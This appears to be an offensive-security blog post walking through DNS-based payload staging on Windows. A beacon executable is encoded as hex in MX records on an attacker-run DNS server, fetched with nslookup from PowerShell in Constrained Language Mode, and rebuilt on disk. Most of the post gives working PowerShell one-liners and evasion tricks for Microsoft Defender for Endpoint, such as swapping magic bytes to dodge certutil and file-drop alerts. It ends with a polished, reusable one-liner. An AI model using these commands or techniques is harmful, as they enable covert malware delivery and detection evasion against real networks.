# Intro
Inspired by recent work I did involving Cobalt Strike DNS beacons, in conjunction with a mission statement to try and evade Microsoft Defender for Endpoint, I spent some time looking into how DNS might be used to transfer a payload to a target machine. I further wanted to challenge myself by trying to do so in a way that is possible even when powershell is in Constrained Language Mode. This research was targeted at more modern implementations of Windows (i.e. Win10+, Server 2019+) but as you see later it may be possible in lower versions.

# Background

## What is DNS Tunneling?

DNS tunneling is a technique that has been around for a long time and used by a variety of attackers. At a basic level it involves using the DNS protocol as a means for data infiltration/exfiltration or as a C2 communications channel.  There are many blog posts you can reference for more information on this topic.

Because this is such a old and well known technique, many organizations have detection methods in place to try and prevent it. 

The DNS record type of choice for DNS tunneling has historically been TXT.  This is because TXT records can hold more data than other records and they are also case-sensitive, something that the other records are not which can have an impact when we start talking about encoding.

## What is Constrained Language Mode?

Constrained Language Mode (CLM) is a restrictive language mode for Powershell which greatly reduces the capabilities and allowed functionality of Powershell.  As a short list, .NET, COM objects, and attacker favorites like (new-object net.webclient).downloadstring... are unavailable.  This link provides more information:

https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/

Organizations will put this policy in force for normal users as part of attack surface reduction rules.  It in effect just makes our lives harder as attackers.

## What do DNS records look like?

Most should be at least cursorily familiar with DNS from use of tools like Nslookup.  But at a basic level, the client sends a query and the DNS server returns an answer to that query.  There are several different kinds of DNS records: CNAME, A, AAAA, TXT, MX, and NS just to name a few.  Each of these records can store and return different information.  These records are configured in a Zonefile, which is served by a DNS server.

An example zonefile is shown here (https://help.dyn.com/how-to-format-a-zone-file/):

```
$ORIGIN example.com.
@                      3600 SOA   ns1.p30.dynect.net. (
                              zone-admin.dyndns.com.     ; address of responsible party
                              2016072701                 ; serial number
                              3600                       ; refresh period
                              600                        ; retry period
                              604800                     ; expire time
                              1800                     ) ; minimum ttl
                      86400 NS    ns1.p30.dynect.net.
                      86400 NS    ns2.p30.dynect.net.
                      86400 NS    ns3.p30.dynect.net.
                      86400 NS    ns4.p30.dynect.net.
                       3600 MX    10 mail.example.com.
                       3600 MX    20 vpn.example.com.
                       3600 MX    30 mail.example.com.
                         60 A     204.13.248.106
                       3600 TXT   "v=spf1 includespf.dynect.net ~all"
mail                  14400 A     204.13.248.106
vpn                      60 A     216.146.45.240
webapp                   60 A     216.146.46.10
webapp                   60 A     216.146.46.11
www                   43200 CNAME example.com.
```

If one were to query NS records for example.com, the query would return ns1.p30.dynect.net, ns2.p30.dynect.net, ns3.p30.dynect.net, and ns4.p30.dynect.net.

# Research

## Domain name registration 

Before we get started we have to talk briefly about setting up DNS records to point at an IP we control and will run a DNS server on.  As shown below I purchased a domain and set up DNS records that point the subdomain "dns" at the "ns1" subdomain which is assigned the public IP of the server.  

![image](https://user-images.githubusercontent.com/91164728/160316942-fc26fcbe-e217-42f8-a768-b420cd02d316.png)

This means that any queries made for "dns.edu....com" will be directed at "ns1.edu....com" which is assigned the IP 3..86.  On that IP we will set up a DNS server to serve our records. This will come around again later. 

## Finding a client side tool

My quest began with a simple google search for "powershell dns module" which returned this link:

https://docs.microsoft.com/en-us/powershell/module/dnsclient/?view=windowsserver2022-ps

Of particular interest was the Resolve-DnsName command.  It appears to be basically a powershell implementation of the well-known Nslookup.exe binary. Note that specific types of records can be requested:

![image](https://user-images.githubusercontent.com/91164728/160312929-cb297543-b9f3-4947-bdca-feef9062e1ef.png)

Ok, so we have a powershell module that is capable of making DNS queries and retreiving the answer.  Does it work in Constrained Language Mode? The answer is kind of.

As you can see here if I open a new powershell window, run Resolve-DnsName, put powershell into CLM (and test with the simple ::WriteLine call), and then run Resolve-DnsName again, it works without issue:

![image](https://user-images.githubusercontent.com/91164728/160314493-d027f4f1-7fee-412c-b6d5-a3d53198d9e5.png)

However if I open a new powershell window and immediately put it into CLM and then try to run Resolve-DnsName it fails:

![image](https://user-images.githubusercontent.com/91164728/160314638-3258609d-777d-4ae6-83e1-d04fcb6667f7.png)

It appears that if a module has been loaded before hand it is able to run once CLM is enforced, however CLM will prevent it from loading if it has not already done so. Thinking forward to a target environment where CLM is enforced for users by default (and with no knowledge if there are certain modules pre-loaded or if DnsClient is one of them), I chose at this point to leave Resolve-DnsName behind and turn back to good old Nslookup.exe.

![image](https://user-images.githubusercontent.com/91164728/160315058-87cd9ec6-4c65-4a5e-8700-f4d8c624d372.png)

Nslookup.exe is a staple of the IT toolkit and a very well known binary used for legitimate purposes.  The odds are in our favor that it will be allowed to execute even in environments where application whitelisting is a concern.

Nslookup will return much the same information as our Resolve-DnsName query, we will just have to manipulate it a little bit differently when the time comes.

## Turning an executable into DNS records?

Ok so we have a means by which to make DNS queries on the victim computer.  How can we provide our payload in a way that Nslookup could download?

Executables are of course binary files which means they aren't human readable.  As a result the data must be transformed into something that is human readable that we could stick into DNS records and that a tool like Nslookup could recover. There are ample encoding options available to us, but the major consideration is what can victim box decode using only native windows tools and capabilities available in CLM?  Base64 is the obvious and often used answer.

Using Base64 we turn our executable into a giant human readable string which can then be broken up into many DNS records and recovered using Nslookup.  On the client side the well known LOLBAS certutil.exe can be used to Base64 decode the compiled DNS records back to binary format.  

This requires we talk a bit more about DNS record types.  Each record type stores certain information in a certain format. A records for example store and return an IPV4 address (111.111.111.111).  AAAA records return an IPV6 address, MX and NS records return domain names, and TXT records can return 255 character long strings.  As was previously mentioned, due to the length of record and case-sensitivity, TXT records have been the obvious choice for attackers as fewer will be required and they are compatible with encoding like Base64.  

Lets see what this looks like.

On our Kali vm we can take our executable and base64 it.  Note the use of the -w 0 switch which will remove all newlines so we are left with a single line of Base64 text:

![image](https://user-images.githubusercontent.com/91164728/160316299-beda425a-a5d3-4467-9d43-6f5bb9bf2b07.png)

Looking at the file shows the Base64:

![image](https://user-images.githubusercontent.com/91164728/160316342-7c2e1ca9-a2cf-4bcc-aee3-4670f4dd6191.png)

We now need to turn this Base64'd file into DNS TXT records that will be served by our DNS server.  

There are a few things I learned during this that I will quickly summarize here before moving on:

  **1.** When multiple records return for a single DNS query, there is no guarantee that they will be returned in "order". This is critical for our purposes, as we need to reassemble a file from all of the TXT records and if they are out of order it won't work.
  
  **2.** Duplicate records aren't returned for a query.  For example, in our zonefile if we had 3 TXT records and 2 of them contained the same information, when we queried TXT records for that domain only 2 records would return as only the unique records are returned.  The not-in-order problem notwithstanding, if we had for example large sections of "AAAAA" (as we do in the Bas64'd payload) that we needed to fill multiple TXT records with, when we queried our domain for TXT records only one of the "A" filled TXT records would return even if there are several of them.
  
With these points in mind we must ensure that only a single TXT record is returned for each DNS query.  Enter subdomains.  Just as we registered "dns.edu...com" as a subdomain of "edu....com", we can provide records for further subdomains (e.g. 1.dns.edu....com).  We can create as many subdomains as needed to in order to serve all our TXT records.

Let look at our Base64'd payload:

![image](https://user-images.githubusercontent.com/91164728/160318505-d7b98905-e475-4ba2-94ae-492bc0bd3c63.png)

As previously mentioned we can stuff 255 characters into each TXT record.  Dividing 413696/255 yields 1,623 after rounding up.  That is a lot of TXT records (and by proxy a lot of subdomains). It is a starting point however.

I wrote a Python3 script to ingest the Base64'd payload and create a zonefile:

![image](https://user-images.githubusercontent.com/91164728/160323059-431413ca-b968-4410-b657-3799a291ddf4.png)

This script will open our Base64'd payload (comp.txt) and use the "chunkstring" function (courtesy of a stack overflow post) in order to split the file up in to 255 character long chunks which we will then create TXT records with.  Note that the IP's here are fake/random and unnecessary. 

Looking at the produced zonefile we see our TXT records:

![image](https://user-images.githubusercontent.com/91164728/160323451-3527df06-36a1-484e-9f85-a3f36031b4e7.png)

Note the number on the far left hand side of each TXT record; this denotes the subdomain. 

Now that our zonefile is created we will need to copy it to our DNS server and then serve it.  I used CoreDNS for this: https://github.com/coredns/coredns

![image](https://user-images.githubusercontent.com/91164728/160324503-beaaca28-df15-4f33-b107-3c848abee162.png)

This shows that I am accepting queries for dns.edu....com on port 53.  In the Corefile I have specified the zonefile created in the previous step to serve records from. To test that our records work we will run nslookup for TXT records belonging to 1.dns....com:

![image](https://user-images.githubusercontent.com/91164728/160323616-d5522549-f00a-4deb-9f51-c11d88c0ce29.png)

There is our TXT record!

## Attack!

We now need to run nslookup... 1623 times.  Less than ideal, but it's what we will do for now.  We will use this powershell one liner in order to run nslookup for each subdomain and then select only the TXT record ($temp[5]) and then build $results as we go.  $results is then written to ./temp.txt, and finally certutil is used to decode temp.txt to custombeacon.exe.

```powershell
$results="";for($num = 1; $num -le 1623 ; $num++){$temp = nslookup -type=TXT "$num.dns.edu....com" 2> $null;$temp = $temp[5].replace("`t","").replace("`"","");$results = $results + $temp};$results > ./temp.txt;certutil -decode ./temp.txt ./custombeacon.exe
```

Upon running our command we see all of the DNS requests on our CoreDNS server:

![image](https://user-images.githubusercontent.com/91164728/160432129-1014f3a2-d8e5-4fc3-b2e4-99398900bb88.png)

And on our client we see that the Certutil command succeeded:

![image](https://user-images.githubusercontent.com/91164728/160325481-fecfd60f-5b27-4bd3-94a9-132f36dd7baf.png)

Our Output Length matches that of our original EXE (and it runs) - excellent!

![image](https://user-images.githubusercontent.com/91164728/160325607-a81ae769-4e3e-49f6-ac8d-7e841af17506.png)

However we have a problem.  Lets look at the MDE dashboard for our evaluation lab machine:

![image](https://user-images.githubusercontent.com/91164728/160325760-bbfb36a4-ff3a-4d15-811c-d44fef2be5e4.png)

## Back to the drawing board

There are 5 alerts here we need to address (ignore the top two "Suspicious usage of certutil.exe to decode an executable" as these are duplicates from running this same attack chain twice during testing).

**1.** Suspicious System Network Configuration Discovery - This pertains to the use of the 'Resolve-DnsName' cmdlet (this test was ran prior to the switch to Nslookup for separate reasons)

![image](https://user-images.githubusercontent.com/91164728/160326028-b9e09be2-212c-4042-9503-a37ade4479c0.png)

**2.**  DNS attack tool or activity - This pertains to the use of TXT records to infil our data

![image](https://user-images.githubusercontent.com/91164728/160326118-357ed7f4-1f78-4fa5-be6e-616ee90bf9b4.png)

**3. / 4. / 5.** - Suspicious usage of certutil.exe to decode an executable / Use of living-off-the-land binary to run malicious code

![image](https://user-images.githubusercontent.com/91164728/160326277-b193b165-8e89-4b4f-852e-5d888d8ef04a.png)

#### 1. Suspicious System Network Configuration Discovery
We are going to write this one off because we are going to switch to Nslookup.  We'll see if it continues to be a problem.  I don't know, but I have a suspicion, that this kind of alert might be ignored by a lot of organizations due to its low priority and seemingly very easy-to-trip nature.

#### 2. DNS attack tool or activity
This alert again related to the use of TXT records to smuggle our payload; this isn't all that surprising, as TXT records have long been the favorite for this kind of activity for good reason.  The solution here would appear to be to try and use an alternate record type, something we will explore in conjunction with what follows in the next alert.

#### 3. / 4. / 5. Suspicious usage of certutil.exe to decode an executable / Use of living-off-the-land binary to run malicious code
It also isn't all that surprising that certutil was flagged decoding our payload; it's an age old trick that any respectable organization should alert on.  However the alert is interestingly specific; it highlights that it was used to decode an *executable*.  This led me to wonder what would happen if I played with the magic bytes of our payload before I Base64 encoded it, and then again on the client side after I used certutil to decode it.  I won't show it here, but this did indeed bypass this alert and I was able to use certutil to decode a Base64 payload and then change the magic bytes back to MZ so that the payload was executable, all using native powershell functionality. 

## Off the beaten path

I decided to try and use MX records instead of TXT records to smuggle the payload. This blog post (https://devblogs.microsoft.com/oldnewthing/20120412-00/?p=7873) notes that the maximum length of a valid DNS name is 255 characters
```
(63 letters).(63 letters).(63 letters).(62 letters)
```
Since MX records return a domain name I should be able to cram quite a bit of data in each octet.  After some testing I decided to shorten each record a bit and only put 50 characters in each octet for a total of 200 per MX record.

There is however a problem.  When it comes to DNS records, only TXT and SPF (a type of TXT record) records are case-sensitive.  Our encoding language, Base64, is case-sensitive.  I spent a couple hours trouble shooting this until I figured it out, but bottom line if we are going to use Base64 we can't use MX records as our nslookup will always return the records in lowercase letters which breaks our encoding.  

We are forced to either find another record type that is case-sensitive and compatible with Base64, or we must find a different encoding language that Windows/powershell in CLM is natively able to decode.  

After some research I found that Powershell is able to turn hex into binary without the use of .NET: https://stackoverflow.com/questions/64925863/how-to-use-powershell-to-convert-hex-string-to-bin

```powershell
$hex = Get-Content -Path "C:\blah\exe-bank.txt" -Raw

# split the input string by 2-character sequences and prefix '0X' each 2-hex-digit string
# casting the result to [byte[]] then recognizes this hex format directly.
[byte[]]$bytes = ($hex -split '(.{2})' -ne '' -replace '^', '0X')
[System.IO.File]::WriteAllBytes("C:\blah\exe-bank.exe", $bytes)
```

With a slight modification to the above (changing [System.IO.File]... to $bytes | set-content....) this should work for our purposes.

MX records also have a "preference" value; this is essentially an ordering of priority when it comes to which MX server should be used for a domain.  This can been seen in the earlier example of a zonefile as the "10 20 and 30" values preceding the domain names for the MX records.  We can use this preference value to our advantage by including several MX records per subdomain and ensuring we have our data in the proper order by sorting by the preference value. This will allow us to drastically cut down on the number of times that we call Nslookup compared to when pulled a single record per subdomain with TXT records.

![image](https://user-images.githubusercontent.com/91164728/160333792-701081dc-8a03-4207-84ab-501aa145cd3a.png)

As shown above, records may return out of order, but with the preference value we can reorder them. 

To implement all this I first wrote a small Python3 script to turn our payload into hex:

![image](https://user-images.githubusercontent.com/91164728/160330735-b075f6c7-80a8-4281-995a-cf9ba2abc1b9.png)

![image](https://user-images.githubusercontent.com/91164728/160330782-4ef54726-bf9e-4f14-91df-c04ca9755f77.png)

I then modified the original Python3 script to create a zonefile with MX records instead of TXT records:

![image](https://user-images.githubusercontent.com/91164728/160338830-75f837da-c794-45e8-9ce9-b6e4860c3155.png)

The major differences being that we are now chunking 200 characters at a time and we are allocating 100 MX records per subdomain; This is being tracked by the j variable, where j in the MX record is the preference value.  It starts at 10 for the first record and increments by 10 all the way up to 1000.  When j reaches 1010, it resets to 10 and i increments by one, where the i variable is the subdomain specified in each MX record.

This script produces a zonefile like such (end of zonefile shown):

![image](https://user-images.githubusercontent.com/91164728/160331208-4e8e6cac-0385-48fc-8812-83a25ace8d4c.png)

Shown here are two subdomains (31.dns.edu....com and 32.dns.edu....com) and several records for each.  The records can be differentiated by the preference value following each MX (31.dns.edu....com: 960, 970, 980, 990, 1000 32.dns.edu....com: 10, 20, 30)

We will have to modify our powershell command pretty heavily to accommodate this new format.  I have shown the script in Powershell ISE with comments to better explain what is happening at each step, but in effect we are going to:

**-1.** For each subdomain

  **--A** Run Nslookup
  
  **--B** For each MX record returned by Nslookup
  
   **---a.** Parse out just our data and store it in an array in order (as sorted by the MX preference value) 
    
  **--C** Append each string of data to our cumulative $results string

![image](https://user-images.githubusercontent.com/91164728/160332632-8aa8a5f4-9b93-493f-9a05-9888fbf8ce81.png)

We then need to take $results and turn the hex back into binary before we write it to disk.  This is where we will pull in the powershell shown earlier.

Stuffed into a single line we get the following:

```powershell
$results="";for($num = 1; $num -le 32; $num ++){$a = nslookup -type=MX "$num.dns.edu....com" 2> $null;$arr = New-Object string[] ($a.count - 3);for($i = 3; $i -le $a.count - 1; $i++){$a[$i] -match '= ?(.*),' > $null;$temp = $matches[1];$a[$i] -match 'r = ?(.*)' > $null;$arr[$temp/10 - 1] = $matches[1].replace(".dns.edu....com","").replace(".","");$matches = $null};Foreach($j in $arr){$results=$results + $j.replace("`n","")}};[byte[]]$bytes = ($results -split '(.{2})' -ne '' -replace '^', '0X');$bytes | set-content -encoding byte .\custombeacon.exe
```

## Take two

Lets run our powershell command on an MDE lab test box and see what happens (we are in CLM just not shown):

![image](https://user-images.githubusercontent.com/91164728/160338481-7423faaa-fb84-42bf-a31b-8610e6a257fd.png)

Executing our beacon (more magic happened on the backend here to use DNS beacons)

![image](https://user-images.githubusercontent.com/91164728/160337563-c5653c35-1399-46d0-aff5-6a814bcb684c.png)

We do get one alert for "SuspiciousFileDrop" behavior however it resolved with "No threats found"... more to explore.  But all alerts relating to TXT records or Certutil to decode an executable are gone. 

![image](https://user-images.githubusercontent.com/91164728/160339982-7fd18f61-067b-46aa-8aca-6b0552cc1003.png)

## Just one step to the left...

MDE didn't like that powershell wrote our payload to disk.  It's understandable; bottom line nslookup pulled an unkown executable from the internet and saved it to disk. How can we mitigate this?

I decided to revisit the magic bytes of the payload. My working theory was that if i changed the magic bytes of the payload to those of say a .txt file and wrote that to disk, then read that file into a new variable and changed the magic bytes back to MZ(executable) and then wrote that back to disk, I might fool MDE because the I/O operation leading to the functional executable landing on disk now originates from a .txt file that already existed on disk as opposed to data pulled from the internet. 

Let's give it a shot.

We can use VIM to open our executable on our attack box.  Note the MZ header in the first two bytes which declares this is an executable:

![image](https://user-images.githubusercontent.com/91164728/160732904-8f16e1be-8228-4fe4-9a02-9939348e37ce.png)

By entering :%!xxd we can edit the file in hex format:

![image](https://user-images.githubusercontent.com/91164728/160732984-e81e8a3d-0611-4624-8676-800359b109a8.png)

and change the first two bytes to FF FE (UTF-16LE byte order mark, commonly seen in text files as per https://en.wikipedia.org/wiki/List_of_file_signatures):

![image](https://user-images.githubusercontent.com/91164728/160733112-07a35748-d2bf-4e42-a877-398955803574.png)

We must now close the hex editor by entering :%!xxd -r which will show that our magic bytes have indeed been replaced:

![image](https://user-images.githubusercontent.com/91164728/160733220-40d8a240-1c1b-4faf-8866-36c7282f8e8b.png)

We can then write and quit VIM.

We will again turn our payload to hex and then use the python3 script to place the altered payload into MX records which can be served on our DNS server.

On the client side we will need to modify our powershell command in order to fix the magic bytes and render our executable functional again.  As mentioned, in an effort to evade the SuspiciousFileDrop alert from MDE we will first write our "txt" file to disk, and then pull it back into memory using get-content.  The relevent modification and addendum to our powershell command is:

```powershell
$bytes | set-content -encoding byte .\custombeacon.txt;[byte[]]$readfile = get-content .\out.txt -encoding byte -raw;$readfile[0x00] = 0x4D;$readfile[0x01] = 0x5A;$readfile | set-content .\new.exe -encoding byte
```

In this command we first write our downloaded payload(with .txt magic bytes) to disk as custombeacon.txt, then read it into a byte array $readfile after which the first and second bytes are set to 0x4D and 0x5A respectively, restoring the MZ header to our payload.  $readfile is then piped to set-content to write our functional payload to disk as new.exe.

Let give this a shot in our MDE VM (note that the command looks a little different, this will be addressed in the next section):

![image](https://user-images.githubusercontent.com/91164728/160734054-3237c191-85e2-4ab8-bdf9-5209cde15bd7.png)

And on the dashboard?

![image](https://user-images.githubusercontent.com/91164728/160734106-94210cd5-48e3-4802-bfbe-2309fe1bd1e1.png)

Success!

# So what does MDE actually see?

We have successfully downloaded and restored our payload to functional format via DNS requests and powershell commands available in Constrained Language Mode. MDE did not alert on anything, but what does MDE actually see? The answer is everything.  

Lets take a look at the timeline of events for our test machine, filtering for events involving powershell:

![image](https://user-images.githubusercontent.com/91164728/160737711-db1c5c8d-30be-450e-9c01-75ab9f5f848e.png)

In this image we see a few of the nslookup.exe calls made by powershell, each of which resulted in a "T1016: System Network Configuration Discovery" event.  Additionally we see "powershell.exe dropped a packed file new.exe" which refers to our now functional executable being written back to disk after the magic bytes were altered.  This triggers a few event ID's, "T1027.002: Software Packing" being the notable one.

By filtering on these events we might be able to see how common or uncommon each one is and how likely our actions are to blend in with the noise of normal actions on the computer.

Looking at T1016:

![image](https://user-images.githubusercontent.com/91164728/160737700-89820fb2-7c51-449f-af70-303c1ba479f0.png)

We see all of our nslookup's, but we also see other events generated by processes like WaAppAgent.exe and WindowsAzureGuestAgent.exe.  These in turn ran things like ipconfig.exe and arp.exe.  So multiple different executables can trigger T1016: System Network Configuration Discovery, which is good for us trying to fly under the radar.

Looking at T1027:

![image](https://user-images.githubusercontent.com/91164728/160734969-1fc43fc2-b394-4e93-97e1-e5bd52c3d9e2.png)

The news is less good here.  The only event for T1027.002: File Packing is our powershell.exe dropping our payload to disk.  I'm not entirely sure why this event fires for our action, but i'm not convinced it has anything to do with the DNS infiltration method but more to do with writing an executable to disk.  In any case, this didn't generate an actual alert, it is just a logged event.  

How many logged events are there and how well catagorized is normal computer functionality? The answers are "lots", and "not very".  In scrolling through to find the powershell events, I came accross this:

![image](https://user-images.githubusercontent.com/91164728/160735323-382d0859-55a6-4899-8c29-1dd0d6078b8e.png)

That certainly looks suspicious... what's going on?

![image](https://user-images.githubusercontent.com/91164728/160735496-4135fa77-962c-47eb-816f-e2f97c9773aa.png)

Oh.  It's just Windows Defender ATP running powershell commands.  

The number of events logged by MDE is mind boggling.  As long as we don't run afoul of an actual alert, I'm not too concerned about our logged actions being discovered during active effects unless we give defenders reasons to go looking.

# Put some polish on it

We have a working POC, but now it's time to refine the product.  I had three major goals here:

1. Automation

2. Reliability

3. Efficiency

## Automation

I started out by combining the python scripts that turned our executable into hex and then created a zonefile.  Next I went through and removed all static references to domain names that will populate the zonefile; these are now passed in via command line args.  Thirdly I added functionality to make a copy of our payload and then modify the magic bytes; this modified copy is what is turned into MX records within our zonefile, eliminating the need for VIM.  Finally the python script prints out the powershell one-liner with the correct number of iterations to run nslookup (dependent on length of payload) and the domain to run nslookup against.  This python script has been uploaded as "createzonefile.py".  

![image](https://user-images.githubusercontent.com/91164728/160739409-21e7127a-1c4c-4c77-ae97-16f9bdc67ddf.png)

## Reliability

In order to increase reliability of the attack I spent some time working with how the python script creates MX records. The major problem point was the last MX record; this cointains the remainder of the payload, as every other record is filled with 200 characters.  Depending on how much remainder there is, we might end up with one, two, three, or four octects partially or completely filled.  I found that nslookup wouldn't pull records if there were too many trailing "."'s, as was the case with our simple python script earlier if less than four octects were being used by the last MX record (e.g. record might be "0000000000000000000000.000000..").  New logic was implemented and tested to ensure that regardless of payload size or the amount of data in the last MX record it would be formatted properly and function as expected. 

The implementation of the powershell one-liner in the python script is another step towards reliability, as it ensures you are provided with the correct number of iterations of nslookup as well as the same domain name specified in the zonefile.

## Efficiency

This last point mainly revolves around the powershell one-liner.  I wanted to try and reduce the length of the command as much as possible should one need to hand type it on a target machine.  Before factoring in the added script to replace the magic bytes, I was able to cut it down by around 30%.

These savings come from a few places:

1. Shorten variables.  $results is now $o. $num is now $a.
2. Aliases.  Select-substring becomes sls.  Set-content becomes sc.
3. Use shortened parameters when possible.  The -Allmatches parameter of select-substring can be abbreviated -a because there are no other parameters beginning with a.
4. Improve regex, loop logic, and array initialization.  Every character counts!

![image](https://user-images.githubusercontent.com/91164728/160744679-a25b5666-e105-41ce-ae04-be7f421d3ca6.png)


I'm sure there is more that could be done, but I am far from proficient in powershell.

The improved powershell one-liner is:

```powershell
$o="";for($a = 1; $a -le <NUMBER_OF_SUBDOMAINS>; $a ++){$b = nslookup -type=MX "$a.<YOUR_DOMAIN_HERE>" 2> $null;$c = @($null)*($b.count - 3);for($i = 3; $i -le $b.count - 1; $i++){$d = ($b[$i] | sls -patt '(?<=\=\s)((\d|\w){1,50}\.?){1,4}' -a).matches.Value;$c[$d[0]/10 - 1] = $d[1].replace(".","")};$c.foreach({$o = $o + $_})};[byte[]]$e = ($o -split '(.{2})' -ne '' -replace '^', '0X');$f = ".\a.txt";$e | sc -en byte $f;[byte[]]$g = gc $f -en byte -raw;$g[0x00] = 0x4D;$g[0x01] = 0x5A;$g | sc .\pay.exe -enc byte;ri $f
```
# Closing thoughts

Using DNS to infiltrate a payload can be an attractive option in highly restrictive environments where normal methods involving HTTP/S and or more conventional methods may not be viable.  In such an environment the next hurdle is likely to be actually executing your payload- Application Whitelisting bypasses is a topic I will likely spend some time diving into in the future.

Thank you to those who stuck with me until the end.  It was a busy few days as I explored and developed this topic and I certainly learned some things as I hope you have.  
